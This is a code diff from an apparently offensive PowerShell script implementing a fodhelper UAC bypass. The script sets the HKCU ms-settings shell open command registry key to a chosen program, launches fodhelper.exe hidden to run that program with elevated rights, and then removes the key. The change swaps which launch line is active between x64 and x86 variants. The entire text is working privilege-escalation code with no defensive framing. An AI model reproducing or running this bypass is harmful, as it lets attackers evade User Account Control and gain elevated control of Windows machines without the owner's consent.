@@ -39,11 +39,11 @@ function FodhelperBypass(){
 	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
 	#Perform the bypass
-		#In Windows execution
-		#Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+		#In Windows x64
+		Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
-		#Remote execution
-		C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
+		#In Windows x86
+		#C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
 
 	#Remove registry structure
 	Start-Sleep 3
